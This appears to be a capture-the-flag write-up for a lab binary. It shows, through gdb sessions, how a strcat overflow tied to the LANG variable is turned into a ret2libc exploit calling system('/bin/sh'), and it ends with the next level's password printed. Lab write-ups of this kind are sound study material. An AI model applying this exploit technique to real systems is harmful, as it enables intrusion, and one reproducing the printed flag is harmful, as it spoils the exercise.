@@ -1,0 +1,51 @@
+# Call to strcat vulnerable to Buffer Oveflow
+   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
+
+# We find that the program use `memcmp` to compare LANG environnement variable with 'nl' or 'fi' ...
+# ... then concatenate the corresponding 'Hello' message with our first argument
+
+# Let try to find at which offset the program segfault before setting LANG
+gdb> pattern create 50
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+gdb> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+SIGSEGV
+gdb> pattern search
+Registers contain pattern buffer:
+EBP+0 found at offset: 26
+
+# With LANG variable set as 'nl'
+$> export LANG='nl'
+gdb> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+SIGSEGV
+gdb> pattern search
+Registers contain pattern buffer:
+EBP+0 found at offset: 19
+EIP+0 found at offset: 23
+
+# Now we need to find which argv[1] or argv[2] allow to overwrite EIP
+gdb> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' $(python -c "print 'B'*27")
+[...]
+EIP: 0x42424242 ('BBBB')
+[...]
+
+# Nice we can see we can overwrite EIP with our second argument
+# We will then use a ret2libc exploit to call libc `system` function
+gdb> info func system
+0xb7e6b060  system
+gdb> info proc map
+[...]
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+[...]
+gdb> find 0xb7e2c000, 0xb7fd2000, "/bin/sh"
+0xb7f8cc58
+1 pattern found.
+
+# If we put a breakpoint after the `ret` instruction of the `greetuser` function
+# We can see that the 4-7th bytes of our first argument is pass to the `system` call
+# Then we just need to prepare our payload
+$> export LANG='nl'
+$> ./bonus2 $(python -c "print 'DUMM' + '\x58\xcc\xf8\xb7' + 'A'*42") $(python -c "print 'A'*23 + '\x60\xb0\xe6\xb7'")
+> cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
